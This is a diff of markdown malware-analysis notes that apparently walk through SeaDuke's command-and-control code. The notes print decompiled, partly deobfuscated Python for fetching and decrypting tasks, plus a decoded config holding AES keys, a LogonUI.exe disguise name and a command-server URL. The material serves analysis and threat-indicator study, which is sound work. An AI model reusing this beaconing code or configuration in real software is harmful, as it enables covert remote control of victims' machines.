@@ -1,4 +1,4 @@
-# 3) fetch tasks with networkhandler
+# how does seaduke fetch instructions from the mothership?
 `main()` asks `networkHandleKlass` to get tasks:
 ```python
 def main():
@@ -7,42 +7,8 @@ def main():
 
 
 class NetworkHandlerKlass(object):
-
     def get_tasks(self):
-        networkTasks=[]
-        my_cryptoklass=CryptoKlass(botKlass.get_key('aes'), botKlass.get_key('aes_iv'))
-        for h in range(botKlass.total_hosts):
-            for t in range(botKlass.total_transports):
-                for _ in range(3):
-                    networkTasks=[]
-                    try:
-                        response_data=self.__send_request(id=botKlass.bot_id)
-                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy=self.decode_data(response_data)
-                        if not 'tasks' in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy:
-                            return[]
-                        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy['tasks']
-                        for networkTask in pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiezD:
-                            if 'task_data' in networkTask and networkTask['task_data']:
-                                networkTask['task_data']=my_cryptoklass.decode_data(networkTask['task_data'])
-                                networkTasks.append(networkTask)
-                        botKlass.is_first_request=False
-                        return networkTasks
-                    except ExceptionKlass:
-                        pass
-                        time_sleep(random_randint(3,8))
-                        continue
-                    except(urllib2_httperror,ValueError,TypeError)as error:
-                        time_sleep(3)
-                        pass
-                    except urllib2_urlerror as error:
-                        pass
-                        time_sleep(5)
-                    except Exception as e:
-                        pass
-                        time_sleep(10)
-                botKlass.change_transport()
-            botKlass.change_host()
-        return networkTasks
+        ...
 ```
 this instantiates a `CryptoKlass` object called `pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTziQDy`.
 ```python
@@ -66,7 +32,7 @@ class NetworkHandlerKlass(object):
                 for _ in range(3):
                     networkTasks=[]
                     try:
-                        response_data=self.__send_request(id=botKlass.bot_id)
+                        response_data = self.__send_request(id=botKlass.bot_id)
                         decoded_response = self.decode_data(response_data)  # pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQizDy renamed to decoded_response
                         if not 'tasks' in decoded_response:
                             return []
@@ -96,7 +62,7 @@ class NetworkHandlerKlass(object):
     def __send_request(self, **x):
         url = x.pop('url', self.url)  #  Syntax : dict.pop(key, def) Parameters : key : The key whose key-value pair has to be returned and removed. def : The default value to return if specified key is not present. 
         encoded_cookie_data = None
-        res= None
+        res = None
         
         if x:
             encoded_cookie_data=self.__encode_cookie(x)
@@ -121,9 +87,10 @@ class NetworkHandlerKlass(object):
             res = d.read()
             e = d.info().get('Content-Encoding')
             if e:
-                res = CryptoKlass.unpack_data(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzeDQy,e)
+                res = CryptoKlass.unpack_data(res, e)
         return res
 ```
+### what is the `url`?
 since `NetworkHandlerKlass` wasnt provided with an url, we rely on its url.
 ```python
 class NetworkHandlerKlass(object):
@@ -146,7 +113,7 @@ class BotKlass(object):
     def current_host(self):
         return self.__settings['host_scripts'][self.__current_host_index]
 ```
-this calls the following:
+`botKlass.current_host` requires `self.__settings` to execute `self.__load_settings()`:
 ```python
 class BotKlass(object):
     ...
@@ -170,30 +137,85 @@ class BotKlass(object):
                 d = get_default_settings()
         return d
 ```
-this calls the following for `settings_file_path`:
+this calls the following for `settings_file_path`, which creates a file path based on the bot's `key_id` (the key_id is defined in `bot_settings`):
 ```python
 class BotKlass(object):
     ...
     @property
     def settings_file_path(self):
-        key_id = get_default_settings()['key_id']
+        key_id = get_default_settings()['key_id']  # hardcoded as P4BNZR0
         if v_sys_platform.startswith('win'):
-            w='tmp' + key_id.lower()
+            w ='tmp' + key_id.lower()
         else:
-            w='.'+key_id
-        pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=tempfile_gettempdir()
+            w ='.'+key_id
+        y = tempfile_gettempdir()
         if v_sys_platform.startswith('win'):
-            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD=ctypes.windll.shell32.SHGetFolderPathW
-            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
-            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
-            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQD(0,0x1C,0,0,pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ)
-            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieyQ.value
-        return os_path.join(pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTzieQy, w)
+            z=ctypes.windll.shell32.SHGetFolderPathW
+            z.argtypes=[ctypes.wintypes.HWND,ctypes.c_int,ctypes.wintypes.HANDLE,ctypes.wintypes.DWORD,ctypes.wintypes.LPCWSTR]
+            a=ctypes.wintypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
+            z(0,0x1C,0,0,a)
+            y=a.value
+        return os_path.join(y, w)
 ```
-which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings).md:
+which calls `get_default_settings()`, which returns a [dict called `bot_settings`](https://github.com/mynameisvinn/Seaduke/blob/master/bot_settings.md):
 ```python
 bot_settings=json_loads(zlib_decompress(base64_b64decode('eJx1kF1PwjAUhv/K0iuNpiUMg8Fw4QSTAfFrQQ3GNN12Nua2dpyWj0n877ZAvPOqzTnP+77nnD3JCtSG41ryFCrRkoHXufRICa223z0R4F4yDb/i7wVb7NLx1XTUfVf6fRXG4xTvdq1fr0ZRNHub9IP70ldDYvVWxouNUyYVzKdhcVHfvkbTWbf/2Juw+fNwSH4ctjaqUiLlGowpZH7MhB1wKWpw8pnKlZyH1NYOvk3zX8uODwa4yAygbWei0uAylsrupxMsGuPsP8jSmGbAWK1kYRRS3UqaSIZa02bZkE8rQcgADy4HWFt6u93STCQQK1XSRNXMRa41IBc5SOPQqDAQCGQ+9em1dxZYshZYehHgBvDGO+Vqi8UCqcKcnZPjrXmROoenXvCweOm4IkgRV3ab04H+FvoFdgWNdw==')))
 
 def get_default_settings():
     return bot_settings
 ```
+if we look at the dict `bot_settings` we see the following:
+```python
+```python
+{'first_run_delay': 0,
+'keys': {'aes': 'KIjbzZ/ZxdE5KD2XosXqIbEdrCxy3mqDSSLWJ7BFk3o=', 'aes_iv': 'cleUKIi+mAVSKL27O4J/UQ=='},
+'autoload_settings': {'exe_name': 'LogonUI.exe', 'app_name': 'LogonUI.exe', 'delete_after': False},
+'host_scripts': ['http://monitor.syn.cn/rss.php'],
+'referer': 'https://www.facebook.com/',
+'user_agent': 'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
+'key_id': 'P4BNZR0',
+'enable_autoload': False}
+```
+since we were interested in:
+```python
+class BotKlass(object):
+
+    def __init__(self):
+        self.__settings = self.__load_settings()
+    
+    @property
+    def current_host(self):
+        return self.__settings['host_scripts'][self.__current_host_index]
+```
+we now know `url` points to http://monitor.syn.cn/rss.php.
+
+## we have the url, now what?
+to refresh, we were evaluating `self.__send_request()`:
+```python
+class NetworkHandlerKlass(object):
+    def get_tasks(self):
+        ...
+		response_data=self.__send_request(id=botKlass.bot_id)
+        ...
+
+    def __send_request(self, **x):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1446
+        ...
+        else:
+            pass
+            header = urllib2_build_opener()
+            header.addheaders=[('User-agent',self.user_agent)]
+            
+            if encoded_cookie_data:
+                header.addheaders.append(('Cookie', encoded_cookie_data))
+            
+            if self.referer:
+                pass
+
+            d = header.open(url)
+            res = d.read()
+            e = d.info().get('Content-Encoding')
+            if e:
+                res = CryptoKlass.unpack_data(res,e)
+        return res
+```
+when we ask `NetworkHandlerKlass` to `__send_request`, it will receive some packet from http://monitor.syn.cn/rss.php and decrypt it with `CryptoKlass`.
